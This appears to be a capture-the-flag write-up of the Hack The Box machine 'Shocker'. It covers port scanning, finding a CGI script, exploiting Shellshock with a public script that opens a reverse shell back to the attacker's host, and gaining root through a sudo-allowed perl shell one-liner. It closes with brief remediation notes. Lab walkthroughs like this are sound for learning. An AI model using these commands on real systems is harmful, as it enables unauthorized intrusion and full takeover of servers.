---
layout: post
category: writeup
---

## Machine Info

- Name: Shocker
- Description: Shocker, while fairly simple overall, demonstrates the severity of the renowned Shellshock exploit, which affected millions of public-facing servers.
- Difficulty: Easy
## Initial Access

Nmap
```bash
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

From this info I can try to visit the page:

![[assets/images/Pasted image 20240119092618.png]]

Nothing too crazy stands out, I can try to check for dirsearch while I enumerate this apache version:
```bash
HTB dirsearch -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64 -e sh -f -u  http://10.10.10.56/cgi-bin/ 

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: sh | HTTP method: GET | Threads: 64 | Wordlist size: 661635

Output File: /home/kali/.dirsearch/reports/10.10.10.56/-cgi-bin-_24-01-19_09-25-34.txt

Error Log: /home/kali/.dirsearch/logs/errors-24-01-19_09-25-34.log

Target: http://10.10.10.56/cgi-bin/

[09:25:35] Starting: 
[09:25:35] 200 -  118B  - /cgi-bin/user.sh
```

I can see that we have /cgi-bin/user.sh, this is screaming shellshock so I'll try to exploit it:

```bash
HTB python2 34900.py payload=reverse rhost=10.10.10.56 rport=80 lhost=10.10.14.14 lport=443 pages=/cgi-bin/user.sh
[!] Started reverse shell handler
[-] Trying exploit on : /cgi-bin/user.sh
[!] Successfully exploited
[!] Incoming connection from 10.10.10.56
10.10.10.56> whoami
shelly

10.10.10.56>
```

We got a shell!
## Privilege Escalation

Checking sudo permissions:
```bash
10.10.10.56> sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```

```bash
shelly@Shocker:/usr/lib/cgi-bin$  sudo perl -e 'exec "/bin/sh";' 
# whoami
root
```

Very simple root!
## Beyond Root

Now since I can't update the machine, what I'll do is get rid of the vulnerable script user.sh

As far as root goes, I'll get rid of the sudo perl usage